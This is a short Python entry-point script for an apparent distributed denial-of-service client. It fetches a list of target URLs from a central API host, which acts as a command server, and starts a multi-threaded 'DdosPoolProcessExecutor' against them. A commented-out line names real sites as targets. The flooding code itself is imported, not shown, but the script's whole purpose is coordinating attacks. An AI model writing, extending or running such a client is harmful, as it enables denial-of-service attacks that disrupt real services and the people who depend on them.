from src.api_client import ApiClient
from src.ddos_pool_executor import DdosPoolProcessExecutor
from src.utils.args_utils import get_cli_arguments
from src.config import API_HOST


def main():
    args = get_cli_arguments()
    threads_count = args.threads
    client_name = args.name

    api_instance = ApiClient(url=API_HOST, client_name=client_name)
    urls_to_attack = api_instance.get_active_tasks()
    # urls_to_attack = ['https://google.com', 'https://facebook.com', 'https://spotify.com']

    executor = DdosPoolProcessExecutor(urls_to_attack, threads_count, api_instance)
    executor.start()


if __name__ == '__main__':
    main()
